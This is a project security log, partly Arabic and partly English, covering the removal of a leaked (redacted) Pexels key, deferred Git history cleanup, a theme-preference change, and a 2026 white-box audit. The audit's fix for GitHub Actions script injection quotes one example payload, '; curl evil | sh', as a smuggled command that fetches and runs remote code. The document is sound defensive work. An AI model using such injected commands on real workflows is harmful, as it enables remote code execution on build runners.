# مهامّ أمنية مؤجّلة (تحتاج موافقة المالك)

هذه الجولة كانت **تنظيفاً آمناً**: أزلنا ملفات غير مرجعية وطبّقنا إصلاحين
أمنيّين لا يكسران التشغيل. تبقّت مهامّ لا يجوز تنفيذها تلقائياً لأنها تمسّ
أسراراً حيّة أو تعيد كتابة تاريخ Git — قرارها للمالك.

## ١) تدوير مفتاح Pexels (عاجل)
- كان المفتاح محفوراً حرفياً في `src/lib/external-visual-sources.ts`:
  `PEXELS_FALLBACK_KEY = '***REDACTED_PEXELS_KEY***'`.
- **أُزيل من المصدر** في هذه الجولة (صار يُقرأ من متغيّر بيئة فقط، وإلا يُتخطّى
  المصدر بأمان). لكن المفتاح **ما زال في تاريخ Git** ومكشوفٌ فعلياً.
- **المطلوب من المالك:** إبطال هذا المفتاح وإنشاء بديل من لوحة تحكّم Pexels
  (Dashboard → API)، ثم وضع الجديد في متغيّر بيئة `VITE_PEXELS_KEY`
  (أو `VITE_PEXELS_API_KEY` المستخدَم كأولوية في الشيفرة). لا تُعِد المفتاح
  إلى المصدر.
- لا يوجد ذكر لهذين المتغيّرين في `.env.example` — يُستحسن توثيقهما هناك.

## ٢) تنظيف تاريخ Git من الأسرار القديمة
- إزالة الملف من الشجرة **لا** تمحوه من التاريخ. المفتاح أعلاه (وأي أسرار
  قديمة أخرى) يبقى قابلاً للاسترجاع من الـcommits السابقة.
- **المطلوب:** بموافقة المالك، تنظيف التاريخ بأداة مثل `git filter-repo`
  ثم `push --force` منسّق (مع تنبيه كل من نسخ المستودع). هذه العملية تعيد
  كتابة التاريخ ولم تُنفَّذ التزاماً بقاعدة «لا إعادة كتابة تاريخ».
- ملاحظة: أُزيلت في هذه الجولة ثلاثة ملفات ZIP تالفة، اثنان منها كانا تحت
  `public/` (يُنشران علناً): `public/whatsapp-bridge-fix-v2.zip` و
  `public/whatsapp-web-bridge-fix.zip`. لو احتوت على أي سرّ، فهي أيضاً ما
  زالت في التاريخ ويشملها تنظيف التاريخ أعلاه.

## ٣) إصلاحات لم تُطبَّق لأنها قد تمسّ التشغيل/المصادقة
- لم نلمس `server.mjs` المنطقي، ولا `firestore.rules`، ولا نظام المصادقة —
  أي تشديد فيها يحتاج مراجعة ووقت اختبار.
- لم نفعّل TypeScript `strict` (يكسر البناء/الـCI في هذه الجولة).

## ٤) ~~تحسين لاحق: احترام prefers-color-scheme~~ — ✅ أُنجز
- كان الموقع يبدأ نهارياً دائماً ولا يقرأ تفضيل نظام الزائر.
- **صار الآن:** الاختيار الصريح المحفوظ (`localStorage.theme-choice`) يتقدّم على
  النظام؛ وعند غيابه يُتبَع `prefers-color-scheme` — ويستجيب حياً لتغيّره أثناء
  الجلسة. تفاصيل التنفيذ في القسم التالي.

## ما طُبِّق فعلاً في هذه الجولة (للمرجع)
- إزالة المفتاح الحرفي من `src/lib/external-visual-sources.ts` (قراءة من البيئة فقط).
- حذف قيمتَي `http://127.0.0.1:34321` و`http://localhost:34321` من `connect-src`
  في CSP الإنتاجية داخل `firebase.json` (بقيت باقي المصادر كما هي).

## جولة السمة (prefers-color-scheme) — ما طُبِّق
- `public/boot.js`: يحسم السمة قبل أوّل رسمٍ للصفحة فلا يومض الوضع الخاطئ
  (الملف مُحمَّل في `<head>` بلا `defer`/`async`، وهو البديل المكافئ للسكربت
  المضمّن لأن CSP الإنتاجية تمنع `'unsafe-inline'` في `script-src`). يراقب
  أيضاً تغيّر تفضيل النظام أثناء الجلسة.
- `src/lib/theme.ts` (جديد): المنطق نفسه لمكوّنات React —
  `readThemeChoice` / `systemPrefersDark` / `resolveTheme` / `writeThemeChoice` /
  `watchSystemTheme` / `syncThemeColorMeta`.
- `src/components/extras.tsx` (`ThemeToggle`): يبدأ من `resolveTheme()`، ويكتب
  اختياراً صريحاً عند الضغط، ويتابع النظام ما دام لا اختيار.
- `src/components/ArticleReader.tsx`: تفضيل القارئ المحفوظ لم يعد يجمّد
  نهار/ليل حين لا اختيار صريح؛ وسطح «الورق» يبقى محفوظاً كما كان.
- مفاتيح التخزين: `theme-choice` = الاختيار الصريح وحده (`light` أو `dark`)؛
  `theme` القديم بقي مرآةً للسمة المطبَّقة لأن شيفرةً أخرى تقرؤه؛
  `theme-choice-migrated` علامةُ ترحيلٍ لمرّة واحدة تمنع أن يتحوّل اتّباعُ
  النظام في الليل إلى اختيارٍ صريحٍ يتجمّد عنده الموقع.
- `<meta name="theme-color">` يتبع السمة (`#FCFCFA` / `#111215`).
- لم تُمسّ لوحة الألوان: الوضع الليلي القائم في `src/index.css` هو نفسه، فلا
  تغيّر في التباين ولا في قراءة النصوص العربية.
- مفتاح Pexels: تُحقِّق من عدم بقاء أي قيمة حرفية في الشيفرة — القراءة من
  `VITE_PEXELS_API_KEY` ثم `VITE_PEXELS_KEY`، وغيابهما يُرجع نتيجة فارغة
  (`if (!apiKey) return []`) فلا يكسر شيئاً. ووُثِّق المتغيّران في `.env.example`.

---

# Security audit round — 2026-09-17 (white-box hardening)

## Fixed this round
1. **GitHub Actions script injection** — `.github/workflows/podcast-soul-forge.yml`.
   `${{ github.event.inputs.slugs | limit | batch }}` were interpolated directly
   into the `run:` shell script. A crafted `workflow_dispatch` input (e.g.
   `; curl evil | sh`) would execute on the runner. Fixed by passing the inputs
   through `env:` variables and referencing them as `$SOUL_FORGE_*`, so the values
   are no longer parsed by the shell command layer. Backwards-compatible.
2. **`.env.production` removed from the tree + git-ignored.** Verified it held ONLY
   public config (`VITE_FIREBASE_*` web keys, public VAPID key, site URL) — no
   non-public secret — so it was safe to `git rm --cached` and add to `.gitignore`.
   The Firebase Web `apiKey` is public by design (not a vuln). History NOT rewritten.
3. **Baseline security headers added to `vercel.json`** (`X-Content-Type-Options`,
   `Referrer-Policy`, `X-Frame-Options`, `Permissions-Policy`, HSTS) for the
   Vercel-served surface. The primary Firebase host already ships these + a full CSP.

## Verified safe (no change needed)
- `server.mjs` Firebase admin auth (`verifyFirebaseAdminToken`) properly verifies
  RS256 signature against Google JWKS, checks `aud`/`iss`/`exp`/`iat`/`auth_time`
  and enforces `admin === true`. No decode-only bypass.
- `canonicalRedirectLocation` only ever redirects to the fixed `canonicalHost` —
  no open redirect.
- No hardcoded non-public secrets found in source (only the public web apiKey).

## Intentionally left (needs owner / could touch live flow)
- Other `workflow_dispatch` inputs interpolated into `run:` across podcast/audio
  workflows (e.g. `podcast-dialogue-final-review.yml`, `auto-audio-r2.yml`,
  `podcast-male-finalist-retest.yml`). Lower risk: `workflow_dispatch` requires
  repo write access. Recommended fix: same `env:` indirection pattern applied above.
- `server.js` `/api/say` Google TTS proxy is unauthenticated (240-char cap +
  in-memory cache). Potential cost/DoS abuse. Recommend a rate limiter / auth;
  left to avoid affecting the live voice flow.
- CSP not added to `vercel.json` (Firebase remains the CSP-enforcing host; adding
  it to a secondary host without live testing risks breaking inline boot logic).
- Prior items from earlier rounds (Pexels key rotation, git-history cleanup for
  old secrets) still stand — owner action required.
- Per audit guardrails: payment, notification/push, WhatsApp bridge logic and the
  `orders`/`invoices`/`pushTokens` Firestore rules were not touched.
